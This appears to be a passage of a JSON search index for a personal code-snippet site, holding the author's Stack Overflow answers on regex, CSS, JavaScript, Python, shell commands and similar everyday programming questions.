{"keys":[{"path":["title"],"id":"title","weight":1,"src":"title","getFn":null},{"path":["body"],"id":"body","weight":1,"src":"body","getFn":null}],"records":[{"i":0,"$":{"0":{"v":"This page has not yet sprouted","n":0.408},"1":{"v":"[Dendron](https://dendron.so/) (the tool used to generate this site) lets authors selective publish content. You will see this page whenever you click on a link to an unpublished page\n\n![](https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/not-sprouted.png)","n":0.189}}},{"i":1,"$":{"0":{"v":"Root","n":1},"1":{"v":"\n# Welcome to bits-and-bobbles\n\nThis is the root of my project, an assortment of fragments of code that I have written in the past or used frequently enough that I think they are worth sharing. Please feel free to use them as you see fit, and share and leave a star if you find them useful!\n\n## What's here?\n\n- [[Stack Overflow|stack-overflow]]\n- [[Unix & Linux Stack Exchange|unix-stack-exchange]]\n- [[Codewars|codewars]]\n- [[Codepens|codepen]]\n- [[Euler Project|euler]]\n- [[Google FooBar|foobar]]\n- [[HackTheBox Ops Notes|hackthebox]]\n- [[Medium Articles|medium]]\n- [[CyberSoc|cybersoc]]\n","n":0.115}}},{"i":2,"$":{"0":{"v":"Unix & Linux Stack Exchange","n":0.447},"1":{"v":"\nMy profile on Unix & Linux Stack Exchange can be found [here](https://unix.stackexchange.com/users/370076/ajmeese7?tab=profile).\n","n":0.289}}},{"i":3,"$":{"0":{"v":"Stack Overflow","n":0.707}}},{"i":4,"$":{"0":{"v":"Regex for all active SCSS variables","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73921130/6456163) for the original answer.\n\nIf you are looking for all occurrences of SCSS variables that are being used, this will work for you:\n\n```regex\n:.*(\\$[\\w-]+)\n```\n\nA demo can be found [here](https://regex101.com/r/WtyoF6/2).\n","n":0.183}}},{"i":5,"$":{"0":{"v":"Remove additional file extensions from filenames","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73921072/6456163) for the original answer.\n\nWhat I recommend is running a regex to remove `.pdf` when the name string ends with it, like so:\n\n```python\nif pdf_checker(name):\n    newName = re.sub(r'\\.pdf$', '.txt', name)\n    convert_pdf_to_txt(name, newName)\n```\n\nThen replace this line:\n\n```python\nmake_new_text_file = open(text_folder_path + '/' + path + '.txt', 'w')\n```\n\nWith the following:\n\n```python\nmake_new_text_file = open(text_folder_path + '/' + txtname, 'w')\n```\n","n":0.136}}},{"i":6,"$":{"0":{"v":"User input validation in Bash","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73837133/6456163) for the original answer.\n\nSee [this thread](https://unix.stackexchange.com/a/562776/370076) for an example of validating user input in Bash.\n\nHere is the code modified for your use case:\n\n```shell\n#!/usr/bin/bash\n\nREGEX='^[YyNn]$'\n\nCHECK=\"your_user_input_var\"\n\nif [[ ! $CHECK =~ $REGEX ]]\nthen\n  echo \"Not ok\"\nelse\n  echo \"ok\"\nfi\n```\n","n":0.164}}},{"i":7,"$":{"0":{"v":"Read team chats with Keybase Chat API","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73804168/6456163) for the original answer.\n\nI found the problem, the Keybase API just wasn't very helpful with the provided error message.\n\nYou need to put quotes around the `{}` in the `echo` statement, like such:\n\n```python\ncmd = \"echo '{}' | keybase chat api > {}\".format(q, json_out)\n```\n","n":0.149}}},{"i":8,"$":{"0":{"v":"Remove blank lines from CSV document","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73802179/6456163) for the original answer.\n\nOne way to do this is to look for only empty lines at the end of the file and remove them all:\n\n```regex\n(\\n,*)+$/g\n```\n\nAn example can be found [here](https://regex101.com/r/YOk2nb/3), it just requires using an empty substitution as demonstrated.\n","n":0.154}}},{"i":9,"$":{"0":{"v":"Pass JSON to Keybase Chat API","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73801257/6456163) for the original answer.\n\nThe `-m` flag is intended to take a JSON string directly instead of reading from STDIN, which is what your `echo` statement is passing.\n\nIf you want to read from `echo`, simply remove the `-m` flag entirely. If you wish to use the `-m` flag and read from a string, try the following format:\n\n```shell\nkeybase chat api -m \"{'method': 'send', 'params': {'options': {'channel': {'name': 'you', 'public': true}, 'message': {'body': 'Still going...'}}}}\"\n```\n","n":0.115}}},{"i":10,"$":{"0":{"v":"Authenticate for Google Identity Services (GIS)","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73778561/6456163) for the original answer.\n\nGAPI is now being discontinued, and Google is transitioning to Google Identity Services (GIS). The new method is similar to that which was suggested by @AlexfromJitbit, with some small modifications:\n\n```html\n<html>\n  <body>\n    <script src=\"https://accounts.google.com/gsi/client\" async defer></script>\n    <div id=\"g_id_onload\"\n         data-client_id=\"YOUR_CLIENT_ID\"\n         data-ux_mode=\"redirect\"\n         data-login_uri=\"https://www.example.com/your_login_endpoint\">\n    </div>\n    <div class=\"g_id_signin\" data-type=\"standard\"></div>\n  </body>\n</html>\n```\n\nThis code is pulled from the new [GIS example](https://developers.google.com/identity/gsi/web/guides/migration#redirect-mode_1), and is recommended for all new applications as the old API will be retired as of 31 March 2023.\n","n":0.113}}},{"i":11,"$":{"0":{"v":"Custom `Yup` validation messages","n":0.5},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73778031/6456163) for the original answer.\n\nOne way you can do this is via regex, by accepting any value that is not `\"none\"`:\n\n```js\nconst NewUserSchema = Yup.object().shape({\n  createDate: Yup.string().nullable().required('Create date is required'),\n  boughtby: Yup.string().matches(/^(?!none).*$/, \"Cannot be none\").required(\"Cannot be none\")\n});\n```\n","n":0.162}}},{"i":12,"$":{"0":{"v":"Solving `'WebElement' object is not subscriptable` in Python","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73737844/6456163) for the original answer.\n\nThe problem is your use of the `find_element` method, because afterwords you attempt to access an index of the variable, when it is a single element in length.\n\nWhat you are looking for is the `find_elements` command, which will return a list from which you can select individual elements. For more information, see the Selenium documentation on this topic [here](https://selenium-python.readthedocs.io/locating-elements.html).\n","n":0.124}}},{"i":13,"$":{"0":{"v":"Remove all escape sequences from a string","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73723939/6456163) for the original answer.\n\nWhat you're looking for is the `re.sub()` method:\n\n```python\nimport re\n\nl = ['S;V;iPad\\r', 'C;M;mouse pad\\r', 'C;C;code swarm\\r', 'S;C;OrangeHighlighter']\nl_new = [re.sub(r'\\r', '', i) for i in l]\nprint(l_new)\n```\n\nThis will remove all occurrences of the `\\r` escape sequence.\n","n":0.16}}},{"i":14,"$":{"0":{"v":"Set default permissions for new files in Linux directory","n":0.333},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73671526/6456163) for the original answer.\n\nI think what you're looking for here is the `setfacl` command, which sets the default permissions for a specified directory. After you mount the directory, try the following:\n\n```shell\nsudo setfacl -d -m u:www-data:rwx /www\n```\n\nIf you want to change the existing permissions as well, add the `-R` flag:\n\n```shell\nsudo setfacl -R -d -m u:www-data:rwx /www\n```\n","n":0.131}}},{"i":15,"$":{"0":{"v":"Display LaTeX in GitHub Markdown","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73671452/6456163) for the original answer.\n\nThe fix to this is to escape your underscore characters, as they are currently being interpreted as italics instead of as part of the mathematical equation:\n\n```md\n1. First she must calculate the inverse of $e \\ (d)$ in $\\mathbb{Z}\\_{1440}$. Recall that $e$ has an inverse in $\\mathbb{Z}\\_{n}$ if $e$ * $e^{-1} \\equiv 1 \\ mod \\ n$. This is easily done using Euclidian's algorithm. <br>\n```\n\nExample of this rendered in the GitHub markdown editor:\n\n[![rendered markdown][1]][1]\n\n\n  [1]: https://i.stack.imgur.com/xq0uQ.png\n","n":0.111}}},{"i":16,"$":{"0":{"v":"Upload image to S3 from memory","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73655576/6456163) for the original answer.\n\nI created [an issue](https://github.com/dexplo/dataframe_image/issues/43) on the `dataframe_image` repository asking this question to the library author, and below is my implementation of his suggestion:\n\n```python\nimport boto3\nimport dataframe_image as dfi\nfrom io import BytesIO\n\n# create the buffer in which to store the generated image\npng_io = BytesIO()\n\n# assuming that your dataframe is stored as `df` variable\ndf.dfi.export(png_io)\n\n# create the boto3 client and upload the BytesIO directly;\n# create your client in whatever way works for you\nsession = boto3.session.Session(aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key, region_name=region_name)\ns3_client = session.client('s3')\ns3_client.upload_fileobj(png_io, 'your_destination_folder/your_destination_file')\n```\n\nFor more information, check this [TechOverflow post](https://techoverflow.net/2021/03/08/how-to-use-boto3-to-upload-bytesio-to-wasabi-s3-in-python/) and this [StackOverflow post](https://stackoverflow.com/a/69443870/6456163).\n\n","n":0.104}}},{"i":17,"$":{"0":{"v":"Match Reaper `BYPASS` with regex","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73549642/6456163) for the original answer.\n\n[Here](https://regex101.com/r/XqVTds/2) is an example of the following matching regex at work:\n\n```regex\nBYPASS.*?(?:WAK \\d \\d)\n```\n\nThis is how you implement the regex in Python:\n\n```python\nimport re\nmatches = re.findall(r'BYPASS.*?(?:WAK \\d \\d)', string, flags=re.S|re.M)\n```\n\nI had to get rid of the capture group with `?:` and set the flags as a parameter to get it to work, but this should be what you need.\n","n":0.126}}},{"i":18,"$":{"0":{"v":"Scroll debounce in JavaScript","n":0.5},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73529341/6456163) for the original answer.\n\nOne solution is to simply have a different initial `eventListener`, since you already have tracking of whether the page is initially loading, and after the initial load then transition it to your `debounce` listener:\n\n```js\n// deBounce function\nconst debounce = (method, delay) => {\n  clearTimeout(method._tId);\n  method._tId= setTimeout(() => {\n    method();\n  }, delay);\n}\n\nconst triggerElement = document.getElementById(\"trigger-element\");\nconst header = document.getElementById(\"h\");\n\nconst animationTriggered = localStorage.getItem(\"animationTriggered\") === \"true\";\nlet initialLoad = true;\n\nconst menuChange = function() {\n  if (initialLoad) {\n    if (animationTriggered) {\n      header.style.background = \"black\";\n    }\n\n    removeEventListener(\"scroll\", scrollFunc);\n    addEventListener(\"scroll\", scrollFunc = function() {\n      // menuChange function invoked WITH the debounce function\n        debounce(menuChange, 100);\n    });\n  } else if (triggerElement.getBoundingClientRect().top < 50) {\n    header.style.background = \"black\";\n    header.style.transition = \"1s\";\n    localStorage.setItem(\"animationTriggered\", \"true\");\n  } else {\n    header.style.background = \"red\";\n    header.style.transition = \".15s\";\n    localStorage.setItem(\"animationTriggered\", \"false\");\n  }\n\n  initialLoad = false;\n}\n\n// menuChange function invoked WITHOUT the debounce function\naddEventListener(\"scroll\", scrollFunc = function() {\n  menuChange();\n});\n```\n\n```css\nbody {\n  margin: 0;\n  height: 200vh;\n}\n\n#h {\n  display: flex;\n  justify-content: center;\n  background: red;\n  color: #fff;\n  position: fixed;\n  top: 0;\n  width: 100%;\n}\n\n#trigger-element {\n  margin-top: 150px;\n  padding: 1rem;\n  background:blue;\n  color: #fff;\n}\n```\n\n```html\n<header id=\"h\">\n  <p>HEADER CONTENT</p>\n</header>\n<div id=\"trigger-element\">Trigger Element</div>\n```\n\nThis is possible by transitioning the `eventListener` from an anonymous arrow function to a named function, allowing us to call `removeEventListener` on that particular listener so a new one can replace it.\n","n":0.069}}},{"i":19,"$":{"0":{"v":"Interact with the shadow DOM in Selenium","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73519541/6456163) for the original answer.\n\nWhat I noticed when using the Selenium head to manually debug is that the `cookie` element does not show up on my machine. If you have anything on your browser/machine that could be preventing the cookie popup, that may be a factor.\n\nAn additional problem is that the `tiktok-cookie-banner` element uses the shadow DOM, which introduces a whole separate element of complexity. To solve this problem, I recommend the [shadow-automation-selenium](https://github.com/sukgu/shadow-automation-selenium) package, which the documentation explains how to use to interact with the element you are interested in. More information about the shadow DOM can be found in [this thread](https://stackoverflow.com/a/55761810/6456163).\n","n":0.098}}},{"i":20,"$":{"0":{"v":"Storing state between page loads","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73515160/6456163) for the original answer.\n\nI recommend using `localStorage` for this particular use case, because it can easily be implemented alongside your current method:\n\n```js\nconst triggerElement = document.getElementById(\"trigger-element\");\nconst header = document.getElementById(\"h\");\n\nconst animationTriggered = localStorage.getItem(\"animationTriggered\") === \"true\";\nlet initialLoad = true;\n\nconst menuChange = function() {\n  if (animationTriggered && initialLoad) {\n    header.style.background = \"black\";\n  } else if (triggerElement.getBoundingClientRect().top < 50) {\n    header.style.background = \"black\";\n    header.style.transition = \"1s\";\n    localStorage.setItem(\"animationTriggered\", \"true\");\n  } else {\n    header.style.background = \"red\";\n    header.style.transition = \".15s\";\n    localStorage.setItem(\"animationTriggered\", \"false\");\n  }\n\n  initialLoad = false;\n}\n\nwindow.addEventListener(\"scroll\", menuChange);\n```\n\nThis will remember the previous state and apply the black background color if the animation was previously triggered. This adds a small amount of overhead, but in a real-world scenario it should not have any noticeable impact on the performance of the application.\n","n":0.09}}},{"i":21,"$":{"0":{"v":"Match Groovy package semver with regex","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73321649/6456163) for the original answer.\n\nI modified your regex to match the package naming convention, you can see a working example [here](https://regex101.com/r/h4o5tS/1):\n\n```regex\n((.*)\\.\\d+\\.\\d+\\.\\d+-\\d+)\\.x86_64\\.rpm\n```\n","n":0.209}}},{"i":22,"$":{"0":{"v":"Get all elements at point with `elementsFromPoint` in JavaScript","n":0.333},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73320961/6456163) for the original answer.\n\nAccording to [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Element/mouseenter_event#usage_notes), the `mouseenter` event does not bubble, whereas the `mouseover` event does. However, even if it DID bubble, your elements currently have no relation to one another, thus the mouse events are captured by the upper element.\n\nOne possible way around this is with the amazing `elementsFromPoint` function in JavaScript, which makes quick work of solving your issue:\n\n```js\n// Only the IDs of the elments you are interested in\nconst elems = [\"1\", \"2\"];\n\n// Modified from https://stackoverflow.com/a/71268477/6456163\nwindow.onload = function() {\n  this.addEventListener(\"mousemove\", checkMousePosition);\n};\n\nfunction checkMousePosition(e) {\n  // All the elements the mouse is currently overlapping with\n  const _overlapped = document.elementsFromPoint(e.pageX, e.pageY);\n\n  // Check to see if any element id matches an id in elems\n  const _included = _overlapped.filter((el) => elems.includes(el.id));\n  const ids = _included.map((el) => el.id);\n\n  for (const index in elems) {\n    const id = elems[index];\n    const elem = document.getElementById(id);\n\n    if (ids.includes(id)) {\n      elem.style.background = \"yellow\";\n    } else {\n      elem.style.background = \"green\";\n    }\n  }\n}\n```\n\n```css\ndiv {\n  width: 100px;\n  height: 100px;\n  background: green;\n  border: 2px solid black;\n}\n.second {\n  transform: translateX(50%) translateY(-50%);\n}\n```\n\n```html\n<div id=\"1\"></div>\n<div id=\"2\" class=\"second\"></div>\n```\n","n":0.076}}},{"i":23,"$":{"0":{"v":"Convert full image paths to relative with regex","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73313760/6456163) for the original answer.\n\nOne way to accomplish this is by looking for the last occurrence of the backslash character, since your examples indicated that the presence of at least once can be relied on.\n\nThe `find` regex:\n\n```regex\n(href|src)=\".*\\\\(.*)\"\n```\n\nThe `replace` regex:\n\n```regex\n$1=\"images\\\\$2\"\n```\n\nYou can see this in action [here](https://regex101.com/r/8c6QoA/1) with the examples you have provided.\n","n":0.137}}},{"i":24,"$":{"0":{"v":"Convert image syntax to Markdown with regex","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73225506/6456163) for the original answer.\n\nI have modified your example to get it working [here](https://regex101.com/r/wp0XGj/1). What you needed to do is escape the square brackets so they would be interpreted literally, since they have special meaning in regex, and you needed to use a capture group to store the matching value in `$1` so you could use it in the replacement.\n\nRegular expression:\n\n```regex\n!\\[\\[.*\\/(.*_image[0-9]{1,2}\\.png)\\]\\]\n```\n\nSubstitution format:\n\n```regex\n![image]\\($1\\)\n```\n","n":0.125}}},{"i":25,"$":{"0":{"v":"Regex that ignores Latin characters","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/73207214/6456163) for the original answer.\n\nOne way to do this is to use word boundaries (`\\b`) instead of the `\\S` anchor:\n\n```regex\n^\\b[\\x20-\\x7E]*\\b$\n```\n\nThis would match your given test case `Priya@ #432`, but would not match `priya##23á` or `Priya@ #432 `. You can see an example of this regex in action on Regex101 [here](https://regex101.com/r/bpcUmQ/1).\n","n":0.139}}},{"i":26,"$":{"0":{"v":"Selecting elements via CSS attribute selectors in Selenium","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72974187/6456163) for the original answer.\n\nXpath can be a hassle sometimes, I recommend using the CSS selector method to accomplish this:\n\n```python\nelement = driver.find_elements_by_css_selector(\"[aria-label='1100-1200-200167-620038']\")\n```\n\nYou could them use the element in your `visibility_of_element_located` method.\n","n":0.174}}},{"i":27,"$":{"0":{"v":"Capturing regex groups in VS Code","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72959497/6456163) for the original answer.\n\nUse the following in your find and replace tool for the find portion:\n\n```regex\n<a[^>]*>(.[^<]*)</a>\n```\n\nThen use the capture group for the replace portion:\n\n```regex\n$1\n```\n\nWhat this does is looks for `<a` then any number of characters that are not the closing angle bracket (`>`). Next it matches all characters up until the next opening angle bracket (`<`), then looks for the closing `</a>`. Finally, all the characters in the middle are what is used to replace the matched text, thanks to the capturing group `$1`.\n","n":0.107}}},{"i":28,"$":{"0":{"v":"Using regular expressions in CSS selectors","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72932790/6456163) for the original answer.\n\nOne way to achieve what you are looking for in pure CSS is with an attribute prefix selector (which uses a form of regular expressions). In your case the following would likely do the trick:\n\n```css\n[id^=\"edit-field-geolocation-proximity-center-geocoder\"] .form-item {\n  /* your styles here :) */\n}\n```\n\n[This thread](https://stackoverflow.com/a/8903313/6456163) offers a lot of additional excellent methods on how to use regex in CSS if you would like to do some additional reading.\n","n":0.117}}},{"i":29,"$":{"0":{"v":"Remove empty space after HTML body","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72932728/6456163) for the original answer.\n\nI can help! The problem is the height of your body, which can be solved with the following CSS:\n\n```css\nbody {\n  min-height: 100%;\n}\n```\n\nThen to give the appearance of no empty space, you can position your footer element all the way at the base of the page, like so:\n\n```css\nfooter {\n  position: fixed;\n  bottom: 0;\n  width: 100%;\n}\n```\n","n":0.129}}},{"i":30,"$":{"0":{"v":"Anchor progress bar to element border","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72928841/6456163) for the original answer.\n\nI was able to get your example working with a few CSS changes, below are the only two parts I needed to change:\n\n```css\n.App {\n  overflow: hidden;\n}\n\n.emptyProgressBar {\n  border-radius: 0px;\n}\n\n.fillingProgressBar {\n  width: 102%;\n}\n```\n\nThen in `App.tsx`, change your left style to `-101`, like the following:\n\n```tsx\nleft: props.percent - 101 + \"%\",\n```\n\nA working example forked from your sandbox is available [here](https://codesandbox.io/s/linear-progress-bar-forked-hgv7kq?file=/src/styles.css).\n","n":0.126}}},{"i":31,"$":{"0":{"v":"Pass list of variables to shell script in GitHub Actions","n":0.316},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72918267/6456163) for the original answer.\n\nToday I was able to do this with the following YAML (truncated):\n\n```yaml\n...\nwith:\n  targets: |\n    FolderA/SubfolderA\n    FolderB/SubfolderB\n```\n\nThe actual GitHub Action passes this as an argument like the following:\n\n```yaml\nruns:\n  using: docker\n  image: Dockerfile\n  args:\n    - \"${{ inputs.targets }}\"\n```\n\nWhat this does is simply sends the parameters as a string with the newline characters embedded, which can then be iterated over similar to an array in a POSIX-compliant manner via the following shell code:\n\n```shell\n#!/bin/sh -l\n\ntargets=\"${1}\"\n\nfor target in $targets\ndo\n  echo \"Proof that this code works: $target\"\ndone\n```\n\nWhich should be capable of accomplishing your desired task, if I understand the question correctly. You can always run something like `sh ./script.sh $target` in the loop if your use case requires it.\n","n":0.092}}},{"i":32,"$":{"0":{"v":"Emulate Terminal Output in Dash UI Textarea Component","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72885945/6456163) for the original answer.\n\nThe way the project I'm working on captures the `stdout` is with `contextlib`. Below is a small code sample that should get the information you are looking for, which you can then append to the value of the textarea:\n\n```python\nfrom contextlib import redirect_stdout\nimport io\n\nwith redirect_stdout(io.StringIO()) as output:\n    # Your code that generates output here\n    ...\n\n    # This will get the lines from the output\n    lines = output.getvalue().splitlines()\n\n    # Append `lines` to the textarea content here\n    ...\n```\n","n":0.111}}},{"i":33,"$":{"0":{"v":"Listening for `close` event of `datetime-local` input","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72744412/6456163) for the original question.\n\nI was able to get this working by using the `onchange` event, but it only works when the user actually interacts with the popup. If they click the default selected date (today) then it functions fine, but if they just leave it selected and close the popup then it doesn't work.\n\nSee example code below:\n\n```js\nconst picker = document.getElementById(\"datePicker\");\n\npicker.onchange = function() {\n  alert(\"This works when the input is changed, but not when the picker is closed without user interaction.\");\n};\n```\n\nThis is more of a workaround than the actual solution I was looking for, so other answers are welcome.\n","n":0.1}}},{"i":34,"$":{"0":{"v":"Excluding spaces from `text-decoration`","n":0.5},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72693354/6456163) for the original answer.\n\nAs you and @dippas figured out, this is currently not supported via pure CSS across all browsers.\n\nI suggest doing this with JavaScript, by splitting the text you are interested in at the space character into separate span elements. You can then apply your `line-through` decoration to the span elements, which will not include the spaces.\n\nHere is a simple example:\n\n```html\n<div>\n  <del>All the text to be marked through here</del>\n  <br />\n  <del>Additional text to be marked through here</del>\n</div>\n```\n\n```css\ndel {\n  text-decoration: none;\n}\n\ndel span {\n  text-decoration: line-through;\n}\n```\n\n```js\nconst elements = document.querySelectorAll(\"del\");\nfor (let i = 0; i < elements.length; i++) {\n  const elem = elements[i];\n  const words = elem.innerText.split(\" \");\n  const spans = words.map((word) => {\n    const span = document.createElement(\"span\");\n    span.innerText = word;\n    return span;\n  });\n\n  elem.innerHTML = \"\";\n  spans.forEach((span) => {\n    elem.appendChild(span);\n    elem.innerHTML += \"&nbsp;\";\n  });\n}\n```\n","n":0.085}}},{"i":35,"$":{"0":{"v":"Setting relative dates in JavaScript with `setDate`","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72691782/6456163) for the original answer.\n\nIn answer to your question, the `setDate()` function is behaving so strangely for you because each time you are setting the date you are setting it relative to the previous setting, so incrementing each time by 31, 32, or 33 days instead of by 1, 2, or 3. See the brilliant answer by @Quentin for more information, this finding was entirely his and I just wanted to mention the root cause in my answer as well as my own fix to your problem.\n\n---\n\nAn alternative solution if you just want to generate the dates:\n\n```js\nconst dayOfMonth = 30;\nconst date = new Date();\ndate.setDate(dayOfMonth);\nconsole.log(\"Date:\", date);\n\nconst timestamp = Date.parse(date);\nfor (let i = 1; i <= 14; i++) {\n  const newTimestamp = timestamp + i * (1000 * 60 * 60 * 24);\n  const newDate = new Date(newTimestamp);\n  console.log(\"New date:\", newDate);\n}\n```\n\nThis method will manipulate the timestamp and generate new dates for each of the timestamps added to the number of milliseconds in a day.\n\nYou could use your date logic within the loop to populate the calendar as you mentioned.\n","n":0.075}}},{"i":36,"$":{"0":{"v":"Preventing page redirect on form submit with JavaScript","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72681340/6456163) for the original answer.\n\nThe key is returning false after calling your function, so the page redirect is not triggered by the input submission:\n\n```html\n<form>\n  <label for=\"pswd\">ENTER PASSWORD</label>\n  <br>\n  <input class=\"box\" type=\"password\" id=\"pswd\">\n  <br>\n  <input class=\"confirm\" type=\"submit\" value=\"SUBMIT\" onclick=\"checkPswd(); return false;\" />\n</form>\n```\n\n```js\nfunction checkPswd() {\n  let confirmPassword = \"08012020\";\n  let password = document.getElementById(\"pswd\").value;\n\n  if (password === confirmPassword) {\n    alert(\"CORRECT!\");\n  } else{\n    alert(\"Password is incorrect, Please try again.\")\n  }\n}\n```\n\nI would like to add that performing client-side password checking is very insecure since the source code can easily be inspected, so if you are hoping to use this in a real website I would suggest you consider a different approach!\n","n":0.096}}},{"i":37,"$":{"0":{"v":"Instituting columns in CSS with `flex`","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72680106/6456163) for the original answer.\n\nYou can always use `display: flex`. Here's an example:\n\n```css\n#container {\n  display: flex;\n  flex-direction: row;\n  width: 100%;\n  justify-content: space-around;\n}\n\n#text-container a {\n  display: block;\n}\n```\n\n```html\n<div id=\"container\">\n  <img src=\"https://via.placeholder.com/150\" />\n  <div id=\"text-container\">\n    <a href=\"https://google.com\">Link 1</a>\n    <a href=\"https://google.com\">Link 2</a>\n    <a href=\"https://google.com\">Link 3</a>\n  </div>\n  <img src=\"https://via.placeholder.com/150\" />\n</div>\n```\n","n":0.146}}},{"i":38,"$":{"0":{"v":"Center angled text in CSS","n":0.447},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72669746/6456163) for the original answer.\n\nI was able to get it looking how you want by modifying the `.front-person-titles>.t1` code to the following:\n\n```css\n.front-person-titles>.t1 {\n  right: 0;\n  bottom: 0;\n  -webkit-transform: rotate(-90deg) translateY(-100%) translateX(-7.5%);\n  -moz-transform: rotate(-90deg) translateY(-100%) translateX(-7.5%);\n  -ms-transform: rotate(-90deg) translateY(-100%) translateX(-7.5%);\n  -o-transform: rotate(-90deg) translateY(-100%) translateX(-7.5%);\n  transform: rotate(-90deg) translateY(-100%) translateX(-7.5%);\n  -webkit-transform-origin: 0% 0%;\n  -moz-transform-origin: 0% 0%;\n  -ms-transform-origin: 0% 0%;\n  -o-transform-origin: 0% 0%;\n  transform-origin: 0% 0%;\n}\n```\n\nYou can see a working JSFiddle [here](https://jsfiddle.net/ajmeese7/sjwL375g/1/).\n","n":0.12}}},{"i":39,"$":{"0":{"v":"Ignore `n` lines of `sed` output","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72669696/6456163) for the original answer.\n\nOne way to do this is to ignore the first two lines of the output in sed:\n\n```shell\nsed \"1,2 ! s/[^[:blank:]]\\{1,\\}/$green&$off/3\";\n```\n","n":0.196}}},{"i":40,"$":{"0":{"v":"Manipulate Pandas Index column on write","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72669566/6456163) for the original answer.\n\nAccording to [this thread](https://github.com/pandas-dev/pandas/issues/26042), the problem can normally be avoided by skipping calling `reset_index`.\n\nIf that doesn't work for you, one alternative solution that was offered is to try the following:\n\n```python\ndf.to_csv(\" file_name.csv \")\ndf_new = pd.read_csv(\"file_name.csv\").drop([\"unnamed 0\"], axis=1)\n```\n","n":0.154}}},{"i":41,"$":{"0":{"v":"Use TypeScript in a React application","n":0.408},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72653154/6456163) for the original answer.\n\nIt's difficult to pinpoint the exact problem without knowing what your `webpack` configuration looks like, but my guess is that you don't have a loader for TypeScript files set up. I recommend adding something like the following to your `module.exports` and seeing if that solves your issue:\n\n```js\nmodule: {\n  rules:[\n    {\n      test: /\\.ts$/,\n      use: \"ts-loader\",\n      include: [path.resolve(__dirname, \"src\")]\n    }\n  ],\n  resolve: {\n    extensions: [\".ts\", \".js\"],\n  },\n},\n```\n","n":0.119}}},{"i":42,"$":{"0":{"v":"Only keep `n` newest files in a directory","n":0.354},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72635466/6456163) for the original answer.\n\nOne way to do this is with the following one-liner, ran from the directory where the logs are located:\n\n```shell\nls -t | head -n -8 | xargs --no-run-if-empty rm\n```\n\nExplanation:\n- `ls -t` - lists all the files in order from youngest to oldest\n- `head -n -8` - gets all the files except the first 8\n- `xargs --no-run-if-empty rm` - deletes the selected files if there are any, preventing errors if you ever have fewer than 8 logs\n\nIf you want to set this up to run automatically every day, giving you peace of mind in case your server is offline on the 7th day of a cycle and misses the one week mark, run `crontab -e` and add the following to your jobs:\n\n```shell\n0 0 * * * cd yourDirNameHere && ls -t | head -n -8 | xargs --no-run-if-empty rm\n```\n\nThen the log cleaner will be ran every night at midnight.\n","n":0.081}}},{"i":43,"$":{"0":{"v":"Use regex on all image src attributes with PHP","n":0.333},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72618755/6456163) for the original answer.\n\nA modification of the thread you linked to do what you are requesting:\n\n```php\n$dom = new DOMDocument();\n$dom->loadHTML($content);\n\nforeach ($dom->getElementsByTagName('img') as $img) {\n    $current_src = $img->getAttribute('src');\n    $new_src = preg_replace('http://', '/files/images', $current_src);\n    $img->setAttribute( 'src', $new_src );\n}\n\n$content = $dom->saveHTML();\n```\n\nI don't have a machine with PHP readily available to test this for you (not at home), so let me know if you have any issues with it and I would be happy to troubleshoot for you.\n","n":0.115}}},{"i":44,"$":{"0":{"v":"Scrape JS-rendered HTML in Python with `BeautifulSoup`","n":0.378},"1":{"v":"\n> See [here](https://stackoverflow.com/a/72585441/6456163) for the original answer.\n\nThis answer is modified from the awesome answer by @hmomin, except this answer gets the words in German instead of English as you requested:\n\n```python\nimport requests\n\nurl = \"https://10fastfingers.com/speedtests/get_words\"\n\ndata = {\n    \"speedtest_mode\": \"\",\n    \"speedtest_id\": \"2\",\n}\n\ncookies = {\n    \"CAKEPHP\": \"c79f210mdl6n2jpp962g9vjk9f\",\n    \"CookieConsent\": \"{stamp:%276CPboWb+OVPYxb8oz6CfbjxqXJzoYqXEDiPE62FxLheS24AUkkmksA==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cver:2%2Cutc:1654956041620%2Cregion:%27us%27}\",\n    \"CakeCookie[lang]\": 